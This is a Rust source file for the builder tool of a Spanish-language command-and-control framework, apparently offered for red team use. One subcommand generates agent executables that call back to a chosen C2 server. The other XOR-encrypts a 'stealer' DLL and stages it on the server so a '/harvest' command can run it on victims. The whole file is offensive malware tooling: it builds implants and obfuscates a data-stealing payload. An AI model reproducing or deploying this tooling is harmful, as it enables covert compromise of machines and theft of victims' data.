//! R2C2 es un proyecto de Command & Control para red team engagements en Linux y Windows.

mod encrypt;
mod dll_encrypt;

use clap::{Parser, Subcommand};
use encrypt::generate_agent;
use dll_encrypt::{encrypt_dll, generate_random_key};
use std::path::Path;

#[derive(Parser)]
#[command(name = "c2r2-builder")]
#[command(about = "C2R2 Agent Builder - Genera agentes y módulos", long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Genera un agente para el C2
    BuildAgent {
        /// Nombre del agente generado (sin extensión .exe)
        #[arg(short, long)]
        name: String,
        
        /// Servidor C2 (IP:Puerto)
        #[arg(short, long, default_value = "127.0.0.1:4444")]
        server: String,
    },
    
    /// Encripta el módulo stealer para ser usado con /harvest
    EncryptModule,
}

fn main() {
    let args = Args::parse();

    match args.command {
        Commands::BuildAgent { name, server } => {
            println!("🔧 C2R2 Agent Builder v2.0");
            println!("🏷️  Agente: {}", name);
            println!("🌐 Servidor C2: {}", server);
            println!("{}", "-".repeat(50));
            
            match generate_agent(&name, &server) {
                Ok(_) => {
                    println!("✅ Agente generado exitosamente: {}.exe", name);
                }
                Err(e) => {
                    eprintln!("❌ Error: {}", e);
                    std::process::exit(1);
                }
            }
        }
        
        Commands::EncryptModule => {
            println!("🔧 C2R2 Module Encryptor v2.0");
            println!("📦 Módulo: stealer");
            println!("{}", "-".repeat(50));
            
            // Buscar DLL en target de Windows (cross-compilation desde Linux)
            let dll_path_win = Path::new("../target/x86_64-pc-windows-gnu/release/stealer.dll");
            let dll_path_native = Path::new("../target/release/stealer.dll");
            
            let dll_path = if dll_path_win.exists() {
                dll_path_win
            } else if dll_path_native.exists() {
                dll_path_native
            } else {
                eprintln!("❌ Error: No se encontró stealer.dll");
                eprintln!("   Ejecuta primero:");
                eprintln!("   cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll");
                eprintln!();
                eprintln!("   Rutas buscadas:");
                eprintln!("   - {}", dll_path_win.display());
                eprintln!("   - {}", dll_path_native.display());
                std::process::exit(1);
            };
            
            println!("📂 DLL encontrada: {}", dll_path.display());
            
            let output_enc = Path::new("../c2r2-server/modules/stealer.enc");
            let output_key = Path::new("../c2r2-server/modules/stealer.key");
            
            // Crear directorio modules si no existe
            if let Some(parent) = output_enc.parent() {
                if !parent.exists() {
                    if let Err(e) = std::fs::create_dir_all(parent) {
                        eprintln!("❌ Error creando directorio modules/: {}", e);
                        std::process::exit(1);
                    }
                }
            }
            
            // Generar clave XOR aleatoria de 32 bytes
            let xor_key = generate_random_key(32);
            
            println!("\n📦 Encriptando stealer.dll...");
            match encrypt_dll(dll_path, output_enc, &xor_key) {
                Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
                Err(e) => {
                    eprintln!("❌ Error encriptando DLL: {}", e);
                    std::process::exit(1);
                }
            }
            
            // Guardar clave
            if let Err(e) = std::fs::write(output_key, &xor_key) {
                eprintln!("❌ Error guardando clave: {}", e);
                std::process::exit(1);
            }
            println!("🔑 Clave guardada: {} ({} bytes)", output_key.display(), xor_key.len());
            
            println!("\n📋 Archivos generados:");
            println!("   - {}", output_enc.display());
            println!("   - {}", output_key.display());
            println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
        }
    }
}
